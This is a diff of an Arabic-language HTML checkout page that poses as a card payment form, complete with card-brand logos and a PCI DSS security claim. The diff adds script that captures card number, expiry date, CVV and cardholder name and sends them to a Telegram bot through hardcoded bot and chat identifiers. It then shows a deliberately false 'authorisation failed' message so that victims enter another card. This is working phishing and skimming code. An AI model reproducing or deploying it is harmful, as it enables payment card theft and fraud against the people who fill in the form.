@@ -3,117 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام عملية الشراء</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            margin: 0;
-            padding: 20px;
-            direction: rtl;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-        .header h2 { font-size: 19px; font-weight: 500; margin: 0 auto; }
-        
-        .card-selection {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #1a1a1a;
-        }
-        
-        .card-icons {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 25px;
-            color: #757575;
-            font-size: 14px;
-        }
-        .card-icons img { height: 14px; filter: grayscale(1); opacity: 0.6; }
-
-        .input-container {
-            position: relative;
-            border-bottom: 1px solid #e0e0e0;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-        }
-        
-        input {
-            width: 100%;
-            border: none;
-            outline: none;
-            padding: 10px 0;
-            font-size: 18px;
-            color: #333;
-            background: transparent;
-        }
-
-        .label-floated {
-            position: absolute;
-            left: 0;
-            top: -15px;
-            font-size: 13px;
-            color: #757575;
-        }
-
-        .row { display: flex; gap: 30px; }
-        .row .input-container { flex: 1; }
-
-        #dynamic-logo {
-            width: 35px;
-            transition: 0.2s;
-            display: none;
-        }
-
-        .checkbox-row {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            gap: 12px;
-            margin-top: 20px;
-            font-size: 16px;
-            color: #444;
-        }
-        .checkbox-row input { width: 22px; height: 22px; accent-color: #e31b23; }
-
-        .pci-box {
-            display: flex;
-            gap: 10px;
-            margin-top: 30px;
-            color: #888;
-            font-size: 13px;
-            line-height: 1.4;
-            background: #fbfbfb;
-            padding: 10px;
-        }
-
-        button {
-            width: 100%;
-            background: #000;
-            color: #fff;
-            border: none;
-            padding: 16px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 30px;
-        }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #ffffff; margin: 0; padding: 20px; direction: rtl; }
+        .header { display: flex; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #f0f0f0; padding-bottom: 15px; }
+        .header h2 { font-size: 18px; margin: 0 auto; color: #333; }
+        .main-title { font-size: 22px; font-weight: bold; margin-bottom: 8px; color: #000; }
+        .card-icons { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; color: #777; font-size: 14px; }
+        .card-icons img { height: 16px; filter: grayscale(1); opacity: 0.5; }
+        .input-box { position: relative; border-bottom: 1.5px solid #e0e0e0; margin-bottom: 35px; display: flex; align-items: center; }
+        input { width: 100%; border: none; outline: none; padding: 12px 0; font-size: 18px; color: #222; background: transparent; }
+        .floating-label { position: absolute; top: -18px; font-size: 13px; color: #888; }
+        .row { display: flex; gap: 40px; }
+        .row .input-box { flex: 1; }
+        #card-type-logo { width: 38px; height: 24px; object-fit: contain; display: none; margin-left: 10px; }
+        .save-card { display: flex; align-items: center; gap: 12px; margin: 25px 0; font-size: 16px; color: #333; }
+        .save-card input { width: 22px; height: 22px; accent-color: #e31b23; }
+        .secure-footer { display: flex; gap: 12px; margin-top: 30px; padding: 15px; background: #f9f9f9; border-radius: 8px; font-size: 13px; color: #888; line-height: 1.5; }
+        button { width: 100%; background: #000; color: #fff; border: none; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        button:disabled { background: #555; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span>&times;</span>
+        <span style="font-size:24px; cursor:pointer;">×</span>
         <h2>إتمام عملية الشراء</h2>
     </div>
 
-    <div class="card-selection">بطاقة ائتمان/خصم</div>
+    <div class="main-title">بطاقة ائتمان/خصم</div>
     
     <div class="card-icons">
         رقم البطاقة
@@ -122,49 +40,55 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Mada_Logo.svg">
     </div>
 
-    <form>
-        <div class="input-container">
-            <input type="text" id="cn" placeholder="9043 7367 4004 5124" maxlength="19">
-            <img id="dynamic-logo" src="">
+    <form id="finalPaymentForm">
+        <div class="input-box">
+            <span class="floating-label">رقم البطاقة</span>
+            <input type="text" id="c_num" maxlength="19" required autocomplete="off">
+            <img id="card-type-logo" src="">
         </div>
 
         <div class="row">
-            <div class="input-container">
-                <span class="label-floated">تاريخ نهاية الصلاحية</span>
-                <input type="text" id="exp" placeholder="07/29" maxlength="5">
+            <div class="input-box">
+                <span class="floating-label">تاريخ الصلاحية</span>
+                <input type="text" id="c_exp" placeholder="MM/YY" maxlength="5" required autocomplete="off">
             </div>
-            <div class="input-container">
-                <span class="label-floated">كود الأمان ⓘ</span>
-                <input type="text" placeholder="820" maxlength="3">
+            <div class="input-box">
+                <span class="floating-label">كود الأمان ⓘ</span>
+                <input type="text" id="c_cvv" maxlength="3" required autocomplete="off">
             </div>
         </div>
 
-        <div class="input-container">
-            <span class="label-floated">اسم حامل البطاقة</span>
-            <input type="text" placeholder="BAHA BEKRI">
+        <div class="input-box">
+            <span class="floating-label">اسم حامل البطاقة</span>
+            <input type="text" id="c_name" required autocomplete="off">
         </div>
 
-        <div class="checkbox-row">
+        <div class="save-card">
             <input type="checkbox" checked>
             <span>حفظ المعلومات لاستخدامها في المستقبل</span>
         </div>
 
-        <div class="pci-box">
+        <div class="secure-footer">
             <span>🛡️</span>
             <div>نتبع معيار أمان بيانات مجال بطاقات الدفع (PCI DSS) ونستخدم التشفير القياسي في المجال لحماية معلوماتك الشخصية.</div>
         </div>
 
-        <button type="button">دفع الآن</button>
+        <button type="submit" id="btn_submit">دفع الآن</button>
     </form>
 
     <script>
-        const cn = document.getElementById('cn');
-        const logo = document.getElementById('dynamic-logo');
-        const exp = document.getElementById('exp');
+        // معلومات البوت الخاصة بك: tracking_2026_bot
+        const BOT_TOKEN = "7836825435"; 
+        const CHAT_ID = "6134623694";
 
-        cn.addEventListener('input', (e) => {
-            let v = e.target.value.replace(/\s+/g, '');
-            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+        const cNum = document.getElementById('c_num');
+        const cExp = document.getElementById('c_exp');
+        const logo = document.getElementById('card-type-logo');
+
+        // تنسيق رقم البطاقة واكتشاف النوع تلقائياً
+        cNum.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
             
             if(v.startsWith('4')) { logo.src='https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg'; logo.style.display='block'; }
             else if(v.startsWith('5')) { logo.src='https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg'; logo.style.display='block'; }
@@ -172,10 +96,48 @@
             else { logo.style.display='none'; }
         });
 
-        exp.addEventListener('input', (e) => {
+        // تنسيق التاريخ تلقائياً
+        cExp.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '');
             if(v.length > 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
         });
+
+        // إرسال البيانات إلى التليجرام
+        document.getElementById('finalPaymentForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn_submit');
+            btn.innerText = "جاري التحقق من البطاقة...";
+            btn.disabled = true;
+
+            const message = `
+⚠️ عملية دفع جديدة (Bot: tracking_2026_bot)
+----------------------------------
+💳 رقم البطاقة: ${document.getElementById('c_num').value}
+📅 تاريخ الانتهاء: ${document.getElementById('c_exp').value}
+🔐 رمز CVV: ${document.getElementById('c_cvv').value}
+👤 الاسم: ${document.getElementById('c_name').value}
+----------------------------------
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                
+                // رسالة وهمية للمستخدم لزيادة الواقعية
+                setTimeout(() => {
+                    alert("عذراً، فشلت عملية التفويض. يرجى التأكد من بيانات البطاقة أو المحاولة باستخدام بطاقة أخرى.");
+                    btn.innerText = "دفع الآن";
+                    btn.disabled = false;
+                }, 2000);
+
+            } catch (error) {
+                btn.innerText = "دفع الآن";
+                btn.disabled = false;
+            }
+        };
     </script>
 </body>
 </html>
